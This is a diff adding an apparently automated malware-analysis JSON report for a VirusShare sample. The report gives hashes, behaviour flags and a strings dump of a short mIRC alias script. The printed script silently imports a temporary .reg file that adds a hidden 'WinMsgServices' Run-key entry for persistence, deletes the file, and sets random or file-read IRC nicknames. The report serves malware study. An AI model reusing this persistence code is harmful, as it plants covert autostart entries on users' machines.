@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "windows": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "[aliases]\nn0=/j /join #$$1 $2-\nn1=/p /part #$$1 $2-dff\nn2=MYS {\nn3=  .set %windows $r(10,1999) $+ .reg \nn4=  .write %windows REGEDIT4\nn5=  .write %windows [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\nn6=  .write %windows \"WinMsgServices\"=\" $+ $remove($mircexe,$mircdir) $+ \"\nn7=  run -n regedit /s %windows \nn8=  timer 1 4 remove %windows\nn9=}\nn10=ilk {\nn11=  nick $read degis.txt\nn12=  anick $read degis.txt\nn13=  fullname $read degis.txt\nn14=  emailaddr $read degis.txt\nn15=  identd on $read degis.txt $+ $r(a,z)\nn16=}\nn17=tek {\nn18=  nick $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(0,99) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z)\nn19=}"
+    },
+    "filename": "VirusShare_1b2dc968376d58acf314f10379210970",
+    "filesize": 699,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1b2dc968376d58acf314f10379210970",
+        "sha1": "b3f458d285aa6aa8a2a09e9b374c5d30c50bb076",
+        "sha256": "da1a6a91e9bfda0dc662ce169d8c36dcc3fbe8bae34bec72b2948d0bded9c63c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[aliases]",
+            "n0=/j /join #$$1 $2-",
+            "n1=/p /part #$$1 $2-dff",
+            "n2=MYS {",
+            "n3=  .set %windows $r(10,1999) $+ .reg ",
+            "n4=  .write %windows REGEDIT4",
+            "n5=  .write %windows [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]",
+            "n6=  .write %windows \"WinMsgServices\"=\" $+ $remove($mircexe,$mircdir) $+ \"",
+            "n7=  run -n regedit /s %windows ",
+            "n8=  timer 1 4 remove %windows",
+            "n9=}",
+            "n10=ilk {",
+            "n11=  nick $read degis.txt",
+            "n12=  anick $read degis.txt",
+            "n13=  fullname $read degis.txt",
+            "n14=  emailaddr $read degis.txt",
+            "n15=  identd on $read degis.txt $+ $r(a,z)",
+            "n16=}",
+            "n17=tek {",
+            "n18=  nick $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(0,99) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z)",
+            "n19=}"
+        ],
+        "file": {
+            "n11=  nick $read degis.txt": "Text",
+            "n12=  anick $read degis.txt": "Text",
+            "n13=  fullname $read degis.txt": "Text",
+            "n14=  emailaddr $read degis.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.256708",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
